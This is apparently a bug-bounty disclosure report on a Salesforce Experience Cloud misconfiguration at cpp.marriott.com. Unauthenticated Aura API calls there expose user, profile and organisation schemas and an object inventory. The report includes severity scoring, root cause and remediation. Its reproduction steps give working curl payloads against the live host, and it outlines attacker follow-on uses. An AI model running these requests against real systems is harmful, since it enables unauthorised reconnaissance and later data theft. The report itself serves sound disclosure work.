# M002 — Unauthenticated Salesforce Aura API Exposes Multiple sObject Schemas and Org Metadata (Guest User Misconfiguration)

**Target:** `cpp.marriott.com`  
**Endpoint:** `POST /s/sfsites/aura`  
**Severity:** Medium  
**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → **5.3**  
**CWE:** CWE-284 (Improper Access Control), CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)  
**Status:** Report-ready  
**Discovered:** 2026-06-21 (Session 2), confirmed + chain-tested 2026-06-22 (Sessions 3, 4, 6–11)  
**Researcher IP used during testing:** `180.148.212.54`  
**Tools:** curl 8.x  

---

## Summary

The Salesforce Experience Cloud (Community Cloud) deployment at `cpp.marriott.com` ("CPP" — Community Partner Portal serving Marriott franchise hotel owners and business partners) has its Guest User profile configured with Aura API access enabled. Any unauthenticated internet user can POST to the Lightning Aura endpoint `/s/sfsites/aura` and invoke multiple Aura controller actions.

Testing confirms **seven sObject schemas and org-level metadata exposed** to unauthenticated callers:

| Object | UI Label | Fields Exposed | Sensitivity |
|--------|----------|----------------|-------------|
| `User` | User | 203 | High — email, name, phone, address, company, community nickname |
| `Profile` | Profile | 517 | High — complete permission flag schema (all Salesforce permission API names) |
| `Organization` | Organization | 41 | Medium — org-level metadata including company name, industry, country, org type |
| `Network` | Network | 10 | Medium — community configuration |
| `ContentDocument` | File | 27 | Medium — file metadata schema including ContentBodyId reference |
| `ContentVersion` | File | 47 | Medium — file version schema with download URL field shapes |
| `FeedItem` | Feed Item | 28 | Medium — community post schema including Body field |

Additionally, `getConfigData` returns a full inventory of **187 accessible sObject API names with key prefixes** (including `OauthToken`, `UserLogin`, `NetworkMember`), and `getPicklistValues` exposes picklist option sets for User fields (UserType 8 values, LanguageLocaleKey 18 values, LocaleSidKey 279 values, TimeZoneSidKey 426 values).

While direct record access is blocked for the guest profile (all record-fetching actions return an empty Aura response at the framework level), schema exposure at this scale provides an attacker with the complete field map and object inventory needed to target any Aura controller that subsequently becomes misconfigured, or to craft precise SOQL payloads if a SOQL-injectable controller is found. This matches the attack class exploited by the ShinyHunters group in March 2026.

---

## Vulnerability Details

### Background: Salesforce Guest User API misconfiguration

Salesforce Experience Cloud sites expose a Lightning Aura API at `/s/sfsites/aura`. When the "Guest User" profile (the anonymous profile assigned to unauthenticated Community visitors) has "API Enabled" permission set, unauthenticated callers can invoke Aura controller actions.

The correct configuration is to disable API access for the Guest User profile. This is a documented security hardening requirement in Salesforce's Trust and Compliance documentation (see References).

### Confirmed behavior

1. `GET https://cpp.marriott.com/s/sfsites/aura` → **HTTP 200** (endpoint accessible unauthenticated)
2. `POST /s/sfsites/aura` with `aura.token=undefined` and `ACTION$getObjectInfo(User)` → **`"state":"SUCCESS"`**, 203 fields returned
3. `POST /s/sfsites/aura` with `ACTION$getObjectInfos(["User","Profile","Organization","Network","ContentDocument","ContentVersion","FeedItem"])` → **`"state":"SUCCESS"`**, all 7 schemas returned (636 KB response)
4. `POST /s/sfsites/aura` with `ACTION$getPicklistValues(User, UserType)` → **`"state":"SUCCESS"`**, 8 UserType picklist values returned (Standard, PowerPartner, PowerCustomerSuccess, CustomerSuccess, Guest, CspLitePortal, CsnOnly, SelfService)
5. `POST /s/sfsites/aura` with `ACTION$getPicklistValues(User, LocaleSidKey)` → **`"state":"SUCCESS"`**, 279 locale values
6. `POST /s/sfsites/aura` with `ACTION$getConfigData` → **`"state":"SUCCESS"`**, 187 accessible sObject API names + key prefixes returned
7. `getObjectInfo` on `Contact`, `Account`, `Lead`, `Opportunity` → `"state":"ERROR"` (those objects restricted for guest)
8. `getItems` / `getListUi` / `searchRecords` / `getCurrentUserOrGuest` (record access actions) → **`actions:[]` empty response** — Aura framework-level block, actionsTotal=0, no record data returned
9. REST sObjects API with guest session cookie → HTTP 401 `INVALID_SESSION_ID` (REST blocked)
10. Salesforce org instance confirmed: `usa850` (via error response body: `a.static.lightning.force.com/usa850.sfdc-8tgtt5`)

### UserType picklist values — confirms portal classification

The `getPicklistValues` action exposes the internal API names for User classification:

| API Value | Label | Significance |
|-----------|-------|-------------|
| `PowerPartner` | Partner | Marriott franchise partner users |
| `PowerCustomerSuccess` | Customer Portal Manager | Elevated partner access |
| `CustomerSuccess` | Customer Portal User | Standard partner access |
| `CspLitePortal` | High Volume Portal | Likely external franchisees |
| `Standard` | Standard | Internal Salesforce users |
| `Guest` | Guest | Unauthenticated / guest session |

The presence of `PowerPartner` and `CspLitePortal` types confirms this org serves external franchise partners as anticipated from the `cpp.marriott.com` hostname.

### Profile object — 517-field permission schema exposed

The `Profile` sObject schema (517 fields) exposes all Salesforce permission flag API names, including every `IsXxx` permission boolean (e.g. `IsApiEnabled`, `IsCreateMobileDataEnabled`, `IsMassInlineEditEnabled`, etc.). While these are schema definitions rather than individual profile records, the field names themselves reveal Marriott's complete internal permission model — every custom and standard permission that has been configured in this org appears as a field in the Profile schema.

### Organization object — 41-field org metadata schema exposed

The `Organization` sObject schema (41 fields) exposes field shapes for org-level metadata: `Name`, `Phone`, `Country`, `City`, `State`, `PostalCode`, `PrimaryContact`, `InstanceName`, `IsSandbox`, `OrganizationType`, `SignupCountryIsoCode`, `UiSkin`, and others. Again these are schema definitions, but they reveal the exact fields present in the Marriott Salesforce org configuration.

### getConfigData — full object inventory (187 objects)

The `getConfigData` action returns the `apiNamesToKeyPrefixes` map — a complete dictionary of sObject API names to their two- or three-character key prefixes for the guest user's accessible objects. This list includes high-sensitivity objects:

| Key Prefix | sObject API Name | Risk if records later accessible |
|-----------|-----------------|----------------------------------|
| `0CQ` | `OauthToken` | Live OAuth tokens for community users |
| `0Yw` | `UserLogin` | Login history + IPs |
| `0DO` | `NetworkMember` | Community user memberships |
| `0up` | `UserPermissionAccess` | Per-user permission data |
| `0g2` | `UserSetupEntityAccess` | Entity-level access records |
| `069` | `ContentDocument` | Uploaded files |
| `068` | `ContentVersion` | File versions |
| `0F9` | `CollaborationGroup` | Chatter groups |
| `0FB` | `CollaborationGroupMember` | Group memberships |
| `0D5` | `FeedItem` | Community post content |

The 187-object inventory gives an attacker the complete sObject map of this org for follow-on SOQL construction.

### Fields exposed in User schema (sample)

| Field API Name | Label | Type |
|----------------|-------|------|
| `Email` | Email | Email |
| `FirstName` | First Name | String |
| `LastName` | Last Name | String |
| `Address` | Address | Address |
| `City` | City | String |
| `CompanyName` | Company | String |
| `CommunityNickname` | Community Nickname | String |
| `HasUserVerifiedEmail` | Has User Verified Email | Boolean |
| `Phone` | Phone | Phone |
| `MobilePhone` | Mobile | Phone |
| `BannerPhotoUrl` | Banner Photo URL | Url |
| `UserType` | User Type | Picklist |
| `IsActive` | Active | Boolean |
| `ContactId` | Contact ID | Reference |
| `AccountId` | Account ID | Reference |

---

## Reproduction Steps

**Prerequisites:** No account required. No cookies required. No prior interaction with the site.

### Step 1 — Verify the Aura endpoint is accessible

```bash
curl -sk -o /dev/null -w "%{http_code}" "https://cpp.marriott.com/s/sfsites/aura"
# Expected: 200
```

### Step 2 — Invoke getObjectInfo on User (primary disclosure)

```bash
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
obj = json.loads(d[d.index('{'):])
for a in obj.get('actions', []):
    print('state:', a.get('state'))
    fields = (a.get('returnValue') or {}).get('fields', {})
    print('field_count:', len(fields))
    for k, v in list(fields.items())[:10]:
        print(' ', k, '->', v.get('label',''), '(', v.get('dataType',''), ')')
"
```

**Expected output:**
```
state: SUCCESS
field_count: 203
  AboutMe -> About Me ( String )
  AccountId -> Account ID ( Reference )
  Address -> Address ( Address )
  ...
```

### Step 3 — Invoke getObjectInfos (batch — shows Profile, Organization, ContentDocument)

```bash
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfos","callingDescriptor":"UNKNOWN","params":{"objectApiNames":["User","Profile","Organization","Network","ContentDocument","ContentVersion","FeedItem"]}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
obj = json.loads(d[d.index('{'):])
for a in obj.get('actions', []):
    print('state:', a.get('state'))
    rv = a.get('returnValue') or {}
    for item in rv.get('results', []):
        r = item.get('result', {})
        if isinstance(r, dict):
            print(' ', r.get('apiName'), ':', len(r.get('fields', {})), 'fields')
        elif isinstance(r, list):
            print(' ERROR:', r[0].get('errorCode','?'), r[0].get('message','')[:60])
"
```

**Expected output:**
```
state: SUCCESS
  User : 203 fields
  Profile : 517 fields
  Organization : 41 fields
  Network : 10 fields
  ContentDocument : 27 fields
  ContentVersion : 47 fields
  FeedItem : 28 fields
```

### Step 4 — Invoke getPicklistValues on User.UserType (partner type enumeration)

```bash
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"aura://RecordUiController/ACTION$getPicklistValues","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User","recordTypeId":"012000000000000AAA","fieldApiName":"UserType"}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
obj = json.loads(d[d.index('{'):])
for a in obj.get('actions', []):
    print('state:', a.get('state'))
    rv = a.get('returnValue') or {}
    vals = rv.get('values', [])
    print('values:', len(vals))
    for v in vals:
        print(' ', v.get('value'), '->', v.get('label'))
"
```

**Expected output:**
```
state: SUCCESS
values: 8
  Standard -> Standard
  PowerPartner -> Partner
  PowerCustomerSuccess -> Customer Portal Manager
  CustomerSuccess -> Customer Portal User
  Guest -> Guest
  CspLitePortal -> High Volume Portal
  CsnOnly -> CSN Only
  SelfService -> Self Service
```

### Step 5 — Invoke getConfigData (org object inventory)

```bash
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
obj = json.loads(d[d.index('{'):])
for a in obj.get('actions', []):
    rv = a.get('returnValue') or {}
    m = rv.get('apiNamesToKeyPrefixes', {})
    print('state:', a.get('state'))
    print('accessible_objects:', len(m))
    for name, prefix in sorted(m.items())[:15]:
        print(' ', prefix, ':', name)
    print('  ...')
"
```

**Expected output:**
```
state: SUCCESS
accessible_objects: 187
  0ap : ManagedContentChannel
  0Ds : UserAppInfo
  ...
  0CQ : OauthToken
  0DO : NetworkMember
  0Yw : UserLogin
  ...
```

### Step 6 (contrast — confirm record access is blocked)

```bash
curl -sk -X POST "https://cpp.marriott.com/s/sfsites/aura" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.SelectableListDataProvider/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"User","layoutType":"COMPACT","pageSize":5,"currentPage":0}}]}' \
  --data-urlencode 'aura.context={"mode":"PROD","fwuid":"NOT_FOUND","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":true}' \
  --data-urlencode 'aura.pageURI=/s/' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -c "
import sys, json
d = sys.stdin.read()
obj = json.loads(d[d.index('{'):])
actions = obj.get('actions', [])
print('actions_count:', len(actions))
print('actionsTotal:', obj.get('perfSummary',{}).get('actionsTotal',0))
print('(empty actions = Aura framework-level block on record access)')
"
```

**Expected output:**
```
actions_count: 0
actionsTotal: 0
(empty actions = Aura framework-level block on record access)
```

This contrast confirms schema actions (getObjectInfo, getObjectInfos, getPicklistValues, getConfigData) bypass the guest block while record access (getItems, getListUi, searchRecords) is correctly blocked at the framework level.

---

## Impact

### Confirmed impact

**Seven sObject schemas unauthenticated** (203 + 517 + 41 + 10 + 27 + 47 + 28 = **873 total field definitions**):

- `User` (203 fields): Full field map including Email, FirstName, LastName, Address, Phone, MobilePhone, CompanyName, CommunityNickname, ContactId, AccountId, UserType — everything needed to construct targeted SOQL queries against user data
- `Profile` (517 fields): Complete Salesforce permission flag schema. Every `IsXxx` permission boolean is exposed by API name, revealing the full access control model of this org
- `Organization` (41 fields): Schema for org-level metadata (Name, Country, City, Phone, IsSandbox, OrganizationType, InstanceName) — reveals Marriott's Salesforce org structure
- `ContentDocument` (27 fields) + `ContentVersion` (47 fields): File storage schema including `ContentBodyId` and download URL field shapes — enables targeted file access queries if any upload-related Aura controller is misconfigured
- `FeedItem` (28 fields): Community post schema including `Body` (post content) and `CreatedById` — enables targeted community activity queries

**Object inventory (187 sObjects)**: The `getConfigData` API names map exposes `OauthToken`, `UserLogin`, `NetworkMember`, `UserPermissionAccess`, `UserSetupEntityAccess`, and 182 other sObjects with their key prefixes — giving an attacker the complete object map for SOQL targeting.

**Picklist enumeration**: UserType values confirm the partner classification structure (PowerPartner, CspLitePortal) useful for social engineering and targeted credential stuffing against franchise partners.

### Context: cpp.marriott.com

The Community Partner Portal serves Marriott's hotel franchise owners and business partners. The `PowerPartner` UserType and the `cpp` (Community Partner Portal) hostname confirm a high-value external-facing deployment where users include hotel franchise owners — a prime target for business email compromise and financial fraud.

### Exploitation class (ShinyHunters March 2026)

This matches the exact misconfiguration class exploited by ShinyHunters in their March 2026 Salesforce Community Cloud campaign. In that campaign, orgs where `getItems` was accessible to guest users had full PII extracted for all community members. This org blocks record access (`getItems` returns `actions:[]` at the Aura framework level), limiting current severity to Medium. However:

1. The underlying misconfiguration (Guest API Enabled) is identical
2. The schema exposure gives an attacker a 100% complete map of all objects and fields for immediate exploitation if record access is re-enabled or if any Aura controller bypasses the framework-level block
3. The presence of `OauthToken` and `UserLogin` in the accessible object inventory means any future misconfiguration has severe consequences

---

## Root Cause

The Salesforce Guest User profile for the `cpp.marriott.com` Experience Cloud site has "API Enabled" checked in Salesforce Setup → Profiles → Guest User Profile. This single permission enables all Aura controller actions that do not independently enforce authentication. The following actions lack their own authentication gate and are accessible to unauthenticated callers:

- `RecordUiController/getObjectInfo` — sObject schema
- `RecordUiController/getObjectInfos` — batch sObject schemas
- `RecordUiController/getPicklistValues` — picklist option sets
- `HostConfigController/getConfigData` — org object inventory

Record-level actions (`getItems`, `getListUi`, `searchRecords`) are blocked at the Aura framework layer — this is a separate mechanism, not the Guest User Profile API permission, and does not compensate for the schema disclosure.

---

## Remediation

1. **Primary fix (blocks all unauthorized API access):** In Salesforce Setup → Digital Experiences → [Site Name] → Administration → Guest User Profile → Uncheck **"API Enabled"**. This prevents all unauthenticated Aura API invocations.
2. **Verify object-level FLS on Guest User Profile:** Ensure the Guest User profile has no Read FLS on `User`, `Profile`, `Organization`, `ContentDocument`, `ContentVersion`, `FeedItem`, or any object containing PII or internal configuration data.
3. **Audit all custom Aura controllers:** Review every `apex://` controller on this Community site for `with sharing` enforcement and session validation before executing SOQL.
4. **Follow Salesforce Security hardening guide:** Salesforce published explicit hardening guidance for Experience Cloud Guest User permissions in 2021 (Security Advisory: Salesforce Community Site Guest User Permissions).

---

## References

- Salesforce Security Advisory — Guest User Permissions (2021): https://help.salesforce.com/s/articleView?id=000356268
- Salesforce Trust — Experience Cloud Guest User Hardening: https://help.salesforce.com/s/articleView?id=sf.networks_guest_user_profile.htm
- ShinyHunters Salesforce Aura campaign (March 2026) — see public reporting
- CWE-284: Improper Access Control
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- HackerOne Marriott program: https://hackerone.com/marriott
